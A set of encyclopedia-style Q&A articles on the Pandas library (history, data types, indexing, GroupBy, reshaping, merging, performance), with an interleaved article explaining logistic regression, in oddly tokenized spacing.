Pandas has been criticized for being hard to learn , presenting a difficult syntax ( at least compared to Python ) , poor documentation and poor support for higher - dimensional data .
Some of the limitations noted above are solved by other libraries , such as Dask and CuDF .
Which are some online resources to learn Pandas ?
10-minute introduction to Pandas .
Source : McKinney 2019 .
The official Pandas documentation is the place for installation guide , user guide , API reference , tutorials , and more .
Beginners can start learning from 10 minutes to pandas user guide .
Getting Started tutorials and tutorials from the community are two useful resources .
DataCamp 's Pandas Cheatsheet and Irv Lustig 's Pandas Cheatsheet are two useful references .
Wes McKinney 's book titled Python for Data Analysis is recommended .
R developers who wish to learn Pandas can start by looking at how R operations map to Pandas .
Developers who wish to contribute to the Pandas project , can visit their GitHub page .
Pandas was open source in late 2009 .
Its creator , Wes McKinney , started working on the project in April 2008 .
His intent is to make data analysis easier for Python programmers and even those who 're not expert programmers .
McKinney notes at the SciPy Conference that other Python packages have appeared recently , offering some of the features of Pandas : Ia , Tab , pydataframe .
NumPy and SciPy have made Python more accessible to the scientific community .
For statistical modelling , there 's StaM , PyMC and SciL. However , there 's no cohesive framework for statistical modelling .
Statisticians continue to prefer R. Pandas is an attempt to change this .
McKinney , the creator of Pandas , gives a presentation with the sub - title 10 Things I Hate About pandas .
To address some of these , he shares his work on a new tool named Badger .
It has a consistent type system , compressed columnar binary storage , and an analytical query processor .
By late 2015 , these ideas resulted in the formation of the Apache Arrow .
Pandas became a fiscally sponsored project of NumFOCUS .
With this , Pandas joins other Python projects that are also sponsored by NumFOCUS : NumPy , Matplotlib , Project Jupyter , and IPython .
Interest in Pandas on StackOverflow .
Source : Kopf 2017 .
In October 2017 , StackOverflow recorded 5 million visits to questions on Pandas from more than 1 million unique visitors .
Many companies use Pandas for data analysis , including Google , Facebook and JP Morgan .
The rising popularity of Python itself from 2012 onwards has been attributed to the adoption of Pandas by data scientists .
From January 2019 , all future releases of Pandas will support only Python 3 .
This means that the last version to support Python 2 is 0.23.4 ( August 2018 ) .
Pandas 1.0.0 has been released .
It requires at least Python 3.6.1 .
On an experimental basis , the data type ` NA ` was introduced to represent missing data .
Data types ` SparseSeries ` and ` SparseDataFrame ` are replaced with ` Series ` and ` DataFrame ` with the ` sparsevalues ` option .
Some APIs are deprecated and others are backward incompatible .
The Pandas 1.0.0 Release Notes has full details .
The two main data structures in Pandas are ` Series ` for 1-D data and ` DataFrame ` for 2-D data .
Data in higher dimensions are supported within the DataFrame using a concept called hierarchical indexing .
For storing axis labels of Series and DataFrame , the data structure used is ` Index ` .
These data structures can be created from Python or NumPy data structures .
Panda data structures store data using NumPy or Panda data types .
Pandas has defined new data types where NumPy data types do n't satisfy specific use cases .
Panda data types are also called Extension types .
They 're extended from Panda ` array ` .
Developers can extend ` array ` to create custom data types .
Pandas includes methods to convert data structures from Pandas to Python or NumPy .
There 's also implicit or explicit conversion of data types since a Series object or a DataFrame column can store values of only one data type .
Could you give example usage of Pandas Series and DataFrame ?
Dataset pnwflights14 stored as a dataframe .
Source : Pathak 2020 .
Consider the pnwflights14 dataset from 2014 .
It captures 162,049 flights departing from two major airports , Seattle and Portland .
A flight is characterized by date and time of departure , arrival / departure delays , carrier , origin , destination , distance , airtime , etc .
In a Pandas DataFrame , each flight becomes a row and each attribute becomes a labelled column .
For analysis , it 's possible to extract only one column from the DataFrame .
The result is a Series data structure .
For example , given the dataframe ` df ` , we can write ` df['air_time ' ] ` or ` df.air_time ` .
Thus , DataFrame is for 2-D data and Series is for 1-D data .
We can also extract multiple columns ( such as ` df[['origin','dest ' ] ] ` ) resulting in another DataFrame .
It 's possible to extract specific rows for analysis .
For example , if we wish to analyze all flights originating from Seattle , we can write ` df[df.air_time=='SEA ' ] ` .
The result is another DataFrame .
If we access a single row ( such as ` df.iloc[0 ] ` or ` df.loc[0 ] ` ) , we get a Series data structure .
In terms of data types , this dataset has a mix of types : integer , float , datetime , string , etc .
However , each column has only one type .
What 's the anatomy of a Pandas DataFrame ?
Anatomy of a Pandas DataFrame .
Source : Birchard 2017 .
A Pandas DataFrame represents tabular data , that is , data in rows and columns .
All values in a column must have the same data type .
Each row can be thought of as representing an entity or thing , with its attributes represented in the columns .
By default , rows and columns are indexed with integers , starting from zero .
For convenience , it 's more common to give labels or descriptive names , particularly for columns .
Thus , rather than writing ` df[0 ] ` we can write ` df['homeTeamName ' ] ` .
Duplicate labels are allowed but can be prevented with the method ` set_flags(allows_duplicate_labels = False ) ` .
We can extract a single column , resulting in a series .
A row can also be extracted into a series , but since columns are likely to have different data types , the type of the resulting series would be ` object ` , a generic type .
The direction of a series is called the axis .
When moving from one row to the next , we 're on axis-0 .
When moving from one column to the next , we 're on axis-1 .
What are the different data types supported in Pandas ?
Different Pandas data types .
Source : PyData 2020j .
Pandas mostly use NumPy arrays and dtypes .
These are float , int , bool , datetime64[ns ] , and timedelta[ns ] .
Unlike NumPy , Pandas ' datetime type is timezone - aware .
For numerical values , the defaults are ` int64 ` and ` float64 ` .
Data types particular to Pandas are BooleanDtype , CategoricalDtype , DatetimeTZDtype , Int64Dtype ( plus other size and signed / unsigned variants ) , IntervalDtype , PeriodDtype , SparseDtype , StringDtype , Float32Dtype , and Float64Dtype .
When reading a data source , Pandas infers the data type for each column .
Sometimes we may want to use a different type .
For example , ' Customer ID ' may be stored as ` float64 ` but we want ` int64 ` ; ' Month ' may be ` object ` but we want ` datetime64[ns ] ` .
For type conversions , we can use methods ` astype ( ) ` , ` to_numeric ( ) ` or ` to_datetime ( ) ` .
There 's also the ` convert_dtypes ( ) ` method to infer the best possible conversion .
What use is string type when there 's already object type ?
Consider the following examples : ` pd .
Series(['red ' , ' green ' , ' blue ' ] ) ` : object data type is used by default ` pd .
Series(['red ' , ' green ' , ' blue ' ] , dtype='string ' ) ` : string data type is used . The object is a more general type .
A DataFrame column with different types is collectively given the object type .
Instead , the string type gives developers clarity on the type of values stored .
It also prevents accidentally storing strings and non - strings together .
Pandas string type , which is an alias for ` StringDtype ` , is also more " closely aligned " to Python 's own ` str ` class .
The underlying storage is ` arrays .
StringArray ` .
In a DataFrame , columns of string type can be more easily separated from columns of object type .
This is possible by calling the method ` select_dtypes(include='string ' ) ` .
While there 's no difference between the two types in terms of performance , it 's possible that future versions of Pandas might implement optimizations for the string type .
What are sparse data types and why do they matter ?
Both Series and DataFrame can be used to store sparse data .
Sparse does n't necessarily mean " mostly zero " values .
Rather , sparse data structures can be seen as a memory optimization technique .
Any value can be specified .
This value is not stored .
However , these data structures behave the same way as their dense counterparts .
The underlying storage for sparse data structures is an ExtensionArray called ` arrays .
SparseArray ` .
Fill value , which is not stored in sparse arrays , can be specified using the argument ` fill_value ` .
We can inspect the proportion of non - sparse values with property ` density ` .
Method ` to_dense ( ) ` yields a dense array .
Methods ` from_spmatrix ( ) ` and ` to_coo ( ) ` help in interfacing with SciPy matrices .
As an example , consider the storage size of these two , using ` df.memory_usage().sum ( ) ` : ` df = pd .
DataFrame([1 , 2 , 2 , 2 ] ) ` : 160 bytes ` df = pd .
DataFrame([1 , 2 , 2 , 2 ] , dtype = pd .
SparseDtype("float " , 2 ) ) ` : 140 bytes What data types deal with missing values in Pandas ?
Showing how Pandas 1.1.5 handles missing values for different types .
Source : Devopedia 2021 .
For speed and convenience , it 's useful to detect missing values .
Traditionally , Pandas have used NumPy ` np.nan ` ( displayed as ` NaN ` ) to represent missing data .
For example , Python 's ` None ` values will result in ` NaN ` in Pandas .
However , ` NaN ` is not used for all data types .
It 's used in a float context .
For datetime objects , ` NaT ` is used , which is compatible with ` NaN ` .
Python 's ` None ` value when converted in a string context becomes string " None " , that is , it 's not treated as a missing value .
A list of integers with some ` None ` values ca n't be converted into a Pandas Series .
To provide more uniform handling of missing values , since Pandas 1.0.0 , there 's ` pd .
NA ` ( displayed as ` < NA > ` ) value .
This is now used for missing values in ` string ` , ` boolean ` and ` Int64 ` ( and variants ) types .
Inserting missing values into a Pandas data structure will trigger the suitable conversion .
Infinite values ` -inf ` and ` inf ` can be treated as ` pd .
NA ` by calling ` pandas.options.mode.use_inf_as_na = True ` .
DataFrame / Series methods ` fillna ( ) ` , ` dropna ( ) ` , ` isna ( ) ` , ` notna ( ) ` and ` interpolate ( ) ` are useful .
How do I convert Panda data structures to / from NumPy or Python equivalents ?
Converting from Pandas Series to Python or NumPy .
Source : Wang 2019 .
Input to the Series constructor can be a Python list or NumPy array .
Thus , we can write ` pandas .
Series([1,2 ] ) ` or ` pandas .
Series(numpy.array([1,2,3 ] ) ) ` .
The Constructors can also accept a tuple , a dictionary or scalar value .
For a dictionary input , the keys become the Series index .
Series methods ` tolist ( ) ` and ` to_numpy ( ) ` return Python list and NumPy ndarray respectively .
Another way to get a NumPy array is to access the property ` Series.values ` , but this is not recommended since for some data types it does n't exactly return an ndarray .
Another property ` Series.array ` returns the underlying ExtensionArray .
This is Pandas ' own array .
If the data is of the NumPy native type , this is a thin wrapper ( no copy ) over the NumPy ndarray .
Likewise , there are many ways to create a DataFrame : from lists , dictionaries , Series , another DataFrame , 1-D/2-D / structured NumPy arrays , or list of dictionaries .
For a dictionary input , the keys become column labels .
If keys are tuples , we create a multi - indexed frame .
Useful methods for conversion include ` to_dict ( ) ` and ` from_dict ( ) ` ( Python ) , and ` to_records ( ) ` and ` from_records ( ) ` ( NumPy ) .
In Pandas 0.20.0 ( joint release with 0.20.1 ) , ` pandas .
Panel ` is deprecated .
The recommended way to represent 3-D data is to use ` MultiIndex ` on a DataFrame .
The method ` to_frame ( ) ` converts from Panel to DataFrame .
To convert to ` xarray ` data structure of package xarray , the method ` to_xarray ( ) ` can be used .
Pandas 1.0.0 has been released .
On an experimental basis , Pandas introduces ` pd .
NA ` to represent missing scalar values .
This is used by ` Int64Dtype ` ( and variants ) , ` StringDtype ` and ` BooleanDtype ` .
In Scikit - Learn , a popular Python library for machine learning , version 0.23.0 is released .
Dataset loaders in this release now support loading data as a Pandas DataFrame using the argument ` as_frame = True ` .
Pandas 1.2.0 has been released .
This introduces ` Float32Dtype ` , ` Float64Dtype ` and ` FloatArray ` .
While the default float uses ` np.nan ` for missing values , the new float types use ` pd .
NA ` .
Logistic regression model .
Source : Polamuri 2017 .
Suppose we 're asked to classify emails into two categories : spam or not spam .
Compare this with another application that attempts to predict product sales given recent advertising expense .
Unlike the second example in which the target variable is continuous , the email classification predicts a categorical variable .
Logistic regression is a statistical method used for classifying a target variable that is categorical in nature .
It is an extension of a linear regression model .
It uses a logistic function to estimate the probability of a target variable belonging to a particular class or category .
Could you explain logistic regression with an example ?
Logistic regression is used for email classification .
Source : Waseem 2020 .
Consider email classification as an example .
To be able to predict if an email is spam or not , we will extract relevant information from the emails , such as : Sender of the email Number of typos in the email Occurrence of words or phrases such as " offer " , " prize " , " free gift " , etc .
The above information is converted into a vector of numerical features .
These numerical features are linearly combined and then transformed using a logistic function to give a score in the range 0 to 1 .
This score is the probability of an email being either spam or not .
If the probability is higher than 50 % , then the email will be classified as spam .
What are the different types of logistic regression ?
There are three types of logistic regression : Binary or binomial , where the dependent variable can have only two outcomes .
Examples : spam / not - spam , dead / alive , pass / fail .
Multiclass or multinomial : where the dependent variable is classified into three or more categories and these categories are not ordered .
Examples : types of cuisines ( Italian , Mediterranean , Chinese ) .
Ordinal : where the dependent variable is classified into three or more categories and these categories are ordered .
Examples : movie rating ( 1 - 5 ) .
Why ca n't I use linear regression for predicting classes ?
Linear Regression vs Logistic Regression .
Source : Jaiswal 2021 .
In classification problems , we are predicting the probability that the outcome variable belongs to a particular class .
If linear regression is used for classification , it will treat the classes or categories as numbers .
It will fit the best line that minimises the distance between the data points and the line .
The linear regression equation would just give scores that lie along the best fit line .
These scores can not be interpreted as probabilities .
A meaningful threshold can not be set to distinguish the classes .
Also , the linear regression model fits a straight line that can extrapolate .
Values can go out of range , such as below 0 or above 1 ( -∞ to ∞ ) .
Since probability lies in a fixed range between 0 to 1 , in logistic regression , a logistic function is applied so that the dependent variable only takes values between 0 and 1 .
What is the logistic function ?
Logistic function .
Source : Molnar 2021 .
The Logistic function , also known as the sigmoid function , is an S - shaped curve that can take any real - valued number and transform it into a number between 0 and 1 using the following equation : $ $ f(x)= \frac{1}{1+e^{-x}}$$ In the above image as x approaches ∞ , then , f(x ) becomes 1 and as x approaches -∞ , then , f(x ) becomes 0 .
$ $ f(x ) = \frac{1}{1+e^{-∞ } } = 1 , \qquad e^{-∞}\to 0$$ $ $ f(x ) = \frac{1}{1+e^{-(-∞ ) } } = \frac{1}{1 + e^∞ } = 0 , \qquad 1/∞ \to 0$$ What are GLMs and how are they relevant to logistic regression ?
Generalized Linear Models ( GLMs ) are a class of non - linear regression models that can be used in certain cases where linear models do not fit well .
They 're applicable when the outcome variable follows a non - linear distribution such as binomial , exponential , poisson , etc .
A GLM is represented by the following equation : $ $ \large{g(E(y))=\beta_0+\beta_1{}x_{1}+\ldots{}\beta_p{}x_{p}}$$ Where , \(E(y)\ ) is the mean value or the expected value of the outcome variable that follows an assumed distribution \(\beta_0+\beta_1{}x_{1}+\ldots{}\beta_p{}x_{p}\ ) is the linear predictor i.e. the weighted sum of features where \(\beta\ ) is the weight and x is the explanatory variable .
\(g\ ) is the link function that mathematically links the expected value of the outcome variable and the linear predictor .
GLM is a generalised form of linear regression and logistic regression is a specific type of GLM .
For logistic regression , we can derive a specific link function \(g\ ) called the logit function .
What is the logistic regression equation and the logit function ?
Effect of coefficients on the logistic function .
Source : van den Berg 2020 .
Let 's start with the linear regression equation : $ $ y=\beta_0+\beta_1{}x_{1}\qquad(1)$$ We derive the link function for logistic regression .
In linear regression , \(y\ ) is a continuous variable .
Since we want a probability for logistic regression , we will wrap the linear predictor in a logistic function so that the values do not go below 0 or beyond 1 .
We will denote this as probability with \(p\ ) : $ $ p=\frac{1}{1+e^{-(\beta_0+\beta_1{}x_{1})}}\qquad(2)$$ The figure shows the probability that a person , given his / her age , will die within the next five years .
We note that changing \(\beta_0\ ) shifts the curve while changing \(\beta_1\ ) affects steepness .
Using ( 1 ) we can rewrite ( 2 ) as : $ $ p=\frac{1}{1+e^{-y}}=\frac{e^y}{1 + e^y}\qquad(3)$$ If \(p\ ) is the probability that an email is spam , then the probability of a non - spam email can be written as : $ $ q=1-p=1-\frac{1}{1+e^{-y}}=\frac{1}{1+e^y}\qquad(4)$$ Dividing ( 3 ) by ( 4 ) we get , $ $ \frac{p}{1-p}=e^y$$ Taking natural logarithm on both sides and substituting the value of y we get the logistic regression equation , $ $ \ln(\frac{p}{1-p})=\beta_0+\beta_1{}x_{1}$$ \(p/(1-p)\ ) is the odds ratio .
\(\ln(p/(1-p))\ ) is the link function or logit function .
The output values from this function are called logits .
What is the cost function for logistic regression ?
Log loss curve .
Source : Mcdonald 2018 .
A cost function quantifies the error between the predicted value and the expected value .
The weight of features in the model is estimated by minimising or maximising this cost function .
The cost function used in logistic regression is known as the Log Loss or Negative Log - Likelihood ( NLL ) equation .
It is the negative average of the log of correctly predicted probabilities for each instance in the training data .
$ $ -\frac{1}{N}\sum_{i = 1}^Ny_i\cdot\ln(p(y_i))+(1-y_i)\cdot\ln(1-p(y_i))$$ Where , \(N\ ) is the number of training samples \(y_i\ ) is the actual value of i'th sample \(p(y_i)\ ) is the predicted probability of the i'th sample We simplify this equation for the two possible outcomes for a single training sample : True output y=1 ( positive ) : \(-(1\cdot\ln(p ) + ( 1–1)\cdot\ln(1-p ) ) = -ln(p)\ ) True output y=0 ( negative ) : \(-(0\cdot\ln(p ) + ( 1–0)\cdot\ln(1-p ) ) = -ln(1-p)\ ) Also in the above graph we can see that since the scale is logarithmic the loss decreases slowly as the predicted probability gets closer to the true label .
But , as the predicted probability diverges from the true label , the loss increases rapidly .
This has the effect of heavily penalising incorrect predictions .
The logistic function is introduced in a series of three papers by Pierre François Verhulst between 1838 and 1847 .
He uses it as a model of population growth by adjusting the exponential growth model , under the guidance of Adolphe Quetelet .
The term regression was coined by Francis Galton to describe a biological phenomenon .
He observes that the heights of descendants of tall ancestors tend to regress down towards a normal average , a phenomenon also known as regression toward the mean .
Wilson and Worcester use a logistic model in bioassay , which is the first known application of its kind .
Cox introduces the multinomial logit model .
This is a step up for logistic regression applications with the logit model .
Daniel McFadden links the multinomial logit to the theory of discrete choice , specifically Luce 's choice axiom , showing that the multinomial logit follows from the assumption of independence of irrelevant alternatives and interpreting odds of alternatives as relative preferences .
This gives a theoretical foundation for the logistic regression .
In 2000 , McFadden was awarded the Nobel Prize for this contribution .
The dataframe is an essential data structure in Pandas and there are many ways to operate on it .
Arithmetic , logical and bit - wise operations can be done across one or more frames .
Operations specific to data analysis include : Subsetting : Access a specific row / column , range of rows / columns , or a specific item .
Slicing : A form of subsetting in which Python slicing syntax ` [ :] ` is used .
Rows / columns are numbered from zero .
Negative integers imply traversal from the last row / column .
Filtering : Obtain rows that fulfil one or more conditions .
Reshaping : Reorganize data such that the number of rows and columns change .
Merging : A DataFrame is merged with another .
This can be a simple concatenation of frames or database - style joins .
Indexing is a general term for subsetting , slicing and filtering .
What are some ways to access values in a Pandas DataFrame ?
There are many ways to access rows and columns of a DataFrame .
Source : PyData 2020b .
Consider a simple DataFrame with index values 10 - 12 and columns A - C. A row or column can be accessed by its index value or column label respectively .
The Column label is used directly in ` [ ] ` : ` df['A ' ] ` .
Index values are used via ` .loc [ ] ` : ` df.loc[10 ] ` .
We can also access a row by its position using ` .iloc [ ] ` : ` df.iloc[0 ] ` .
In our example , there are many ways to get the last item , a scalar value : Row first : ` df.iloc[2]['C ' ] ` , ` df.loc[12]['C ' ] ` , ` df.loc[12 , ' C ' ] ` Column first : ` df['C'][12 ] ` , ` df['C'].loc[12 ] ` , ` df['C'].iloc[2 ] ` To access multiple rows use ` df.loc[[10,11 ] ] ` or ` df.iloc[0:2 ] ` .
For multiple columns , use ` df[['A','B ' ] ] ` .
To get the last two columns of the last two rows , we can write ` df.loc[[11,12 ] , [ ' B','C ' ] ] ` , ` df.iloc[1:][['B','C ' ] ] ` , ` df[['B','C']].iloc[1 : ] ` or ` df[['B','C']].loc[[11,12 ] ] ` .
Integer lists ` df.iloc[[1,2],[1,2 ] ] ` or slicing ` df.iloc[1:,1 : ] ` or ` df.iloc[-2 : , -2 : ] ` can be used .
Positional and label - based indexing can be combined : ` df.loc[df.index[[0 , 2 ] ] , ' A ' ] ` .
Callable can be used for indexing .
The function takes a series or dataframe and must return a valid index .
For example , ` df.loc [ : , lambda df : [ ' A','B ' ] ] ` or ` df[lambda df : df.columns[0 ] ] ` .
What is multi - indexing on a Pandas DataFrame ?
An exampled of MultiIndex on both rows and columns .
Source : Stringham 2019 .
Hierarchical indexing or MultiIndex allows us to work with higher dimensional datasets using a 2-D DataFrame .
A MultiIndex could be seen as an array of unique tuples .
In fact , it can be created from a list of arrays , an array of tuples , a DataFrame or from a product of iterables .
Referring to the figure , rows can be accessed using ` df.loc['a ' ] ` or ` df.loc['a ' , : ] ` .
For multi - level indexing , use ` df.loc[('a','one ' ) ] ` , ` df.loc[('a','one ' ) , : ] ` or ` df.loc[(slice(None),'one ' ) , : ] ` .
Likewise for columns , we have ` df['A ' ] ` , ` df.loc[:,'A ' ] ` or ` df.loc [ : , ( slice(None ) , ' x ' ) ] ` .
Multi - indexing across rows and columns can be done with ` df['A']['x ' ] ` , ` df['A','x ' ] ` or ` df.loc[:,('A','x ' ) ] ` .
To get specific items , use ` df.loc[('a','one'),('B','x ' ) ] ` or ` df.loc[('a','one'),'B ' ] ` .
Partial slicing is done using ` df.loc[('a ' , ' one'):('b ' , ' two ' ) ] ` ( result has four rows ) .
Reindexing is done with ` df.loc[[('a ' , ' one ' ) , ( ' b ' , ' two ' ) ] ] ` ( result has two rows ) .
With two levels on the index , ` df.swaplevel ( ) ` will change the order of the levels .
Note that ` df.loc[('a','one ' ) , : ] ` is valid but ` df.loc[['a','one ' ] , : ] ` is not .
In this context , lists and tuples have different semantics : For indexing , a tuple is a multi - level key whereas a list specifies several keys .
How can I filter a Pandas DataFrame ?
Boolean arrays of the same size as index can be used for filtering , that is , select rows indexed with ` True ` .
For example , ` df.loc[~df.index.isin([11 ] ) ] ` ignores a specific index ; ` df[df['A']>0 ] ` selects only positive values of column A ; ` df[(df['A ' ] > 2 ) & ( df['B ' ] < 3 ) ] ` shows a complex expression where use of parenthesis is important .
The method ` query ( ) ` can simplify the syntax for complex expressions .
Thus , for columns a - d , we can write ` df.query('a not in b ' ) ` instead of ` df[~df['a'].isin(df['b ' ] ) ] ` ; ` df.query('a in b and c < d ' ) ` instead of ` df[df['b'].isin(df['a ' ] ) & ( df['c ' ] < df['d ' ] ) ] ` .
Whereas ` df[df .
A>0 ] ` will return rows that match the condition , ` df.where(df .
A>0 ) ` will return a dataframe of the same shape as the original .
Where the condition is false , NaN will be returned .
An optional second argument to ` where ( ) ` is the replacement value .
The inverse boolean operation of ` where ( ) ` is ` mask ( ) ` , that is , it returns rows that do n't match the condition .
To select only rows with null values , use ` df[df.isnull().any(axis=1 ) ] ` .
Use ` df[~df.isnull().any(axis=1 ) ] ` to do the reverse .
For MultiIndex DataFrame , the ` isin ( ) ` method can be used .
For example , ` df.loc[df.index.isin([('a','one ' ) , ( ' b','two ' ) ] ) ] ` or ` df.loc[df.index.isin(['a','c ' ] , level=0 ) ] ` .
How do I do GroupBy operations on a Pandas DataFrame ?
Visualizing groupby().agg ( ) on a DataFrame .
Source : Bosler 2019 .
GroupBy uses a split - apply - combine workflow .
Data is split using index or column values .
A function is applied to each group independently .
The results are combined into a single data structure .
In the apply step , data can be aggregated ( sum , mean , min , etc ) , transformed ( normalize data , fill in missing values , etc ) or filtered ( discard small groups , filter data based on group mean , etc ) .
To group by single column ' A ' or index ' a ' , use ` df.groupby('A ' ) ` or ` df.groupby('a ' ) ` .
Index grouping can also be done by position : ` df.groupby(level=0 ) ` .
To group by multiple columns or indices , use ` df.groupby(['a ' , ' A ' ] ) ` .
To group by all levels except ' b ' , use ` df.groupby(level = df.index.names.difference('b ' ) ) ` .
If a column and index share the same name ' b ' , use ` df.groupby([pd .
Grouper(level='b ' ) , ' A ' ] ) ` ( index ' b ' ) or ` df.groupby([pd .
Grouper('b ' ) , ' A ' ] ) ` ( column ' b ' ) .
To aggregate , simply call the function after grouping : ` df.groupby('A').sum ( ) ` ; or ` df.groupby('A').agg([np.sum , np.mean ] ) ` to aggregate in many ways .
Each column can be aggregated differently : ` df.groupby('A').agg({'C ' : np.sum , ' D ' : lambda x : np.std(x , ddof=1 ) } ) ` .
methods ` transform ( ) ` , ` filter ( ) ` , ` resample ( ) ` , ` expanding ( ) ` , ` rolling ( ) ` and ` emw ( ) ` can be used after ` df.groupby ( ) ` .
For grouping datetime types , ` pd .
Grouper(key , level , freq , axis , sort ) ` is useful .
How can I reshape a Pandas DataFrame ?
Some mthods that reshape a Pandas DataFrame .
Source : PyData 2020d .
When data is in " record " form , ` pivot ( ) ` spreads rows into columns .
The method ` melt ( ) ` does the opposite .
Methods ` stack ( ) ` and ` unstack ( ) ` are designed for MultiIndex objects and they 're closely related to pivot .
They can be applied on Series or DataFrame .
Here are a few examples : ` df.pivot(index='foo ' , columns='bar ' , values='baz ' ) ` : Column ' foo ' becomes the index , ' bar ' values become new columns and values of ' baz ' become the values of the new DataFrame .
A more generalized API is ` df.pivot_table ( ) ` that allows for duplicate values of an index / column pair .
` df.melt(id_vars=['A','B ' ] ) ` : Two columns are retained and other columns are spread into rows .
Two new columns named ' variable ' ( with old column names as values ) and ' value ' are introduced .
The original index can be retained but values will be duplicated .
` df.stack ( ) ` : Columns become part of a new inner - most index level .
If the dataframe has hierarchical column labels , level can be specified as an argument .
` df.unstack('second ' ) ` or ` df.unstack(1 ) ` : Values of index ' second ' are spread into new columns .
If no argument is supplied , the inner - most index is spread .
These methods , when combined with GroupBy and aggregations , can be expressive .
Examples : ` df.stack().mean(1).unstack ( ) ` , ` df.groupby(level=1 , axis=1).mean ( ) ` , ` df.stack().groupby(level=1).mean ( ) ` and ` df.mean().unstack(0 ) ` .
What are the ways to combine two datasets in Pandas ?
Database - style joins of two Pandas DataFrame structures .
Source : Jain 2020 .
Perhaps the simplest way to understand is by concatenating two or more frames that share the same column labels .
Rows of one are concatenated to the other : ` pd.concat([df1 , df2 ] ) ` .
To concatenate column - wise , use ` pd.concat([df1 , df2 ] , axis=1 ) ` .
If the index values do n't match , we re - index before concatenating : ` pd.concat([df1 , df2.reindex(df1.index ) ] , axis=1 ) ` .
The argument ` join ` takes values ` outer ` ( default ) and ` inner ` .
An outermost level of multi - index can be created with ` pd.concat([df1 , df2 ] , keys=['A','B ' ] ) ` .
Database - style joins are possible with ` df.join(df1 ) ` in which the argument ` how ` takes four values : ` left ` , ` right ` , ` outer ` , ` inner ` .
By default , joins are based on an index .
With the ` on ` argument , we can choose to join a column or index level of ` df ` with an index of ` df1 ` .
Joins based on MultiIndex are supported .
Method ` df.merge ( ) ` is more flexible than join since index levels or columns can be used .
If merged in only columns , indices are ignored .
Unlike joining , cross merging ( a cartesian product of both frames ) is possible .
The methods ` pd.merge ( ) ` , ` pd.merge_ordered ( ) ` and ` pd.merge_asof ( ) ` are related .
Examples of merge , join and concatenate are available in the user guide .
Could you share some best practices or tips for using Pandas DataFrame ?
Here are some tips and pointers relevant to DataFrame operations : While ` df['A ' ] ` is used to access a column , ` df .
A ` is a handy short form .
This is called attribute access .
The column name must be a valid Python identifier and it should n't conflict with existing method / attribute .
Thus , ` df.1 ` and ` df.first name ` ( has a whitespace ) are not allowed .
` df.min ` and ` df.index ` conflict with existing method / attribute .
The syntax ` df['A ' ] ` results in a series data structure whereas ` df[['A ' ] ] ` returns another dataframe .
On a MultiIndex DataFrame , consider ` dfmi['one']['second ' ] ` versus ` dfmi.loc [ : , ( ' one','second ' ) ] ` .
Both give the same result , but the latter is faster .
The former form is actually two operations : first ` dfmi['one ' ] ` returns a DataFrame , then ` [ ' second ' ] ` is chained to it .
To create an explicit copy , write ` df.copy ( ) ` .
The statements ` df1 = df ; df1[0:3 ] = 0 ` does n't create a copy and modify the original DataFrame .
Remember that ` loc [ ] ` is for label - based indexing and ` iloc [ ] ` is for integer - based indexing .
Integers may be used for the former , but they 're treated as labels .
When filtering by datetime values , their attributes can be used , such as , ` df.loc[(df['Date'].dt.month==3 ) | ( df['Date'].dt.month==11 ) ] ` .
Anatomy of a Pandas groupby with named aggregation .
Source : Lynn 2015 .
In Pandas 0.25.0 , Named Aggregation is introduced .
This uses a name tuple ` pd .
NamedAgg ( ) ` with two fields , ` column ` and ` aggfunc ` .
The latter can be set to a callable or a string alias .
For a more compact code , plain tuples can be used instead .
This is now the recommended replacement for using " dict - of - dicts " , which was deprecated in version 0.20.0 ( May 2017 ) .
In Pandas 1.1.0 , the ` ignore_index ` argument is added to ` melt ( ) ` with a default value of True .
If set to False , the index is retained although duplicate values will be present in the result .
For GroupBy , it 's now possible to retain ` NA ` values in group keys .
For example , ` df.groupby(by=["b " ] , dropna = False).sum ( ) ` will retain ` NA ` values in column ' b ' .
In Pandas 1.2.0 , exponentially weighted window operations are supported .
Thus , we can write , for example , ` df.groupby('A').ewm(com=1.0).mean ( ) ` .
Performance of Pandas can be improved in terms of memory usage and speed of computation .
Optimizations can be done in two ways : ( a ) learning best practices and calling Pandas APIs the right way ; ( b ) going under the hood and optimizing the core capabilities of Pandas .
This article covers both these aspects .
As a general observation , Pandas were designed for data analysis and usability .
On the other hand , NumPy was designed for performance .
However , there are some techniques to make Pandas more performant without sacrificing their ease of use .
There are also third - party libraries that build on or work with Pandas to achieve better performance .
What 's an essential approach towards performant Pandas code ?
Vectorization is much faster than standard loops .
Source : Droste 2019 .
Perhaps the most important rule is to avoid using loops in the Panda code .
Looping over a Series or a DataFrame processes data one item or row / column at a time .
Instead , operations should be vectorized .
This means an operation should be performed on the entire series or DataFrame row / column .
Developers should think of all operations as matrix computations that can be parallelized .
The worst or slowest approach is to use ` df.iloc[i][j ] ` within a ` for ` loop .
A slightly better approach is to use ` df.iterrows ( ) ` that returns a tuple containing a row index and a Series for the row .
Even better is to remove loops completely and use ` df.apply ( ) ` that takes as first argument a function that 's applied to each row or column .
This internally uses Cython iterators .
By far , the best approach is to use vectorization .
For example , if ` addr ` is a series containing addresses , ` addr.str.upper().str.replace ( ' .
' , ' ' ) ` is applied to all items " at once " .
The register size and the computer 's instruction set determines how many items can be parallelized .
For data manipulation , what are some techniques for faster code ?
Indices are commonly used in Pandas for lookup or merging two datasets .
It 's faster to merge based on the index .
For example , ` listings_.merge(reviews _ , left_index = True , right_index = True ) ` is faster than ` listings.merge(reviews , on='listing_id ' ) ` , given that ` reviews _ = reviews.set_index('listing_id ' ) ` and ` listings _ = listings.set_index('listing_id ' ) ` .
When chaining multiple operations , order is important .
For example , it 's faster to filter first and then merge .
Thus , ` listings.merge(reviews[reviews[listing_id].isin(listings[listing_id ] ) ] , on='listing_id ' ) ` is faster than ` listings.merge(reviews , on='listing_id ' ) ` .
What are some best practices for handling datetime data types ?
In general , adopt vectorization over explicit loops .
If this is not possible , prefer ` df.apply ( ) ` , ` df.itertuples ( ) ` or ` df.iterrows ( ) ` in that order .
If datetime values are stored as object data type , use ` pd.to_datetime ( ) ` method to convert to datetime type .
Explicitly passing the ` format ` argument to this method speeds up the conversion .
In electricity billing , suppose different tariffs are applied based on time of the day .
We can use ` df.isin ( ) ` to selectively apply the tariff to data subsets .
An even better way is to use ` pd.cut ( ) ` .
We can reduce execution time further by converting data to NumPy arrays .
In this example , it 's also convenient to use the datetime column as the index .
What are some techniques to improve Pandas ' performance ?
There are a few known techniques to speed up Pandas : Cython : Cython is a superset of Python .
It 's Python code with additional type information .
This is translated into optimized C / C++ code and then compiled as Python extension modules .
Passing NumPy ndarray ( rather than creating and passing Pandas Series ) into Cython functions gives further improvement .
Numba : This is a just - in - time ( JIT ) compiler .
